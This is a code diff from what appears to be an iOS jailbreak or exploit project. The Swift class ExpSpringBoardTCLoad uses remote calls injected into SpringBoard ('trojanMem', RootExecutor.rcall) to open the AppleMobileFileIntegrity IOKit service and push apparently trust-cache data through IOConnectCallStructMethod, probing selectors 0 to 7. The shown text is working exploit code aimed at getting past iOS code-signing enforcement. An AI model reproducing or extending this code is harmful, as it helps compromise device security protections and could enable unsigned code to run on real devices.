@@ -55,7 +55,7 @@ final class ExpSpringBoardTCLoad {
         
         let RTLD_DEFAULT = UInt64(bitPattern: -2)
         
-        // Get IOKit function addresses from SpringBoard
+        // Get IOKit function addresses from SpringBoard (for logging only)
         let ioMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
         let ioGetMatch = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceGetMatchingService"))
         let ioOpen = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceOpen"))
@@ -75,10 +75,9 @@ final class ExpSpringBoardTCLoad {
         log("")
         
         // IOServiceMatching("AppleMobileFileIntegrity")
-        // NOTE: IOServiceMatching takes const char* and returns CFMutableDictionaryRef
-        // The string must be in remote process memory
+        // Use rcall (name-based) instead of rcallAddr — more reliable for shared cache functions
         let amfiStr = remote_alloc_str(sb, "AppleMobileFileIntegrity")
-        let matching = RootExecutor.rcallAddr(sb, ioMatching, amfiStr)
+        let matching = RootExecutor.rcall(sb, "IOServiceMatching", amfiStr)
         log("IOServiceMatching → 0x\(String(matching, radix: 16))")
         
         guard matching != 0 && matching != 0xDEAD else {
@@ -89,7 +88,7 @@ final class ExpSpringBoardTCLoad {
         
         // IOServiceGetMatchingService(kIOMainPortDefault=0, matching)
         // NOTE: matching dict is consumed by this call (CFRelease'd internally)
-        let service = RootExecutor.rcallAddr(sb, ioGetMatch, 0, matching)
+        let service = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matching)
         log("AMFI service → 0x\(String(service, radix: 16))")
         
         guard service != 0 else {
@@ -106,10 +105,10 @@ final class ExpSpringBoardTCLoad {
         }
         log("task_self = 0x\(String(taskSelf, radix: 16))")
         
-        // IOServiceOpen
+        // IOServiceOpen(service, task_self, type=0, &connection)
         let connAddr = sb.trojanMem + 0x2800
         sb[connAddr].setValue32(0)
-        let kr = RootExecutor.rcallAddr(sb, ioOpen, service, taskSelf, 0, connAddr)
+        let kr = RootExecutor.rcall(sb, "IOServiceOpen", service, taskSelf, 0, connAddr)
         let conn = sb[connAddr].value32()
         log("IOServiceOpen → kr=0x\(String(kr, radix: 16)) conn=0x\(String(conn, radix: 16))")
         
@@ -139,7 +138,7 @@ final class ExpSpringBoardTCLoad {
         var foundSel = false
         for sel: UInt32 in 0..<8 {
             sb[outSizeAddr].setValue64(256)
-            let callKr = RootExecutor.rcallAddr(sb, ioCall,
+            let callKr = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                 UInt64(conn), UInt64(sel), tcBuf, UInt64(tcData.count), outBuf, outSizeAddr)
             
             let migBadId: UInt64 = 0xe00002c2
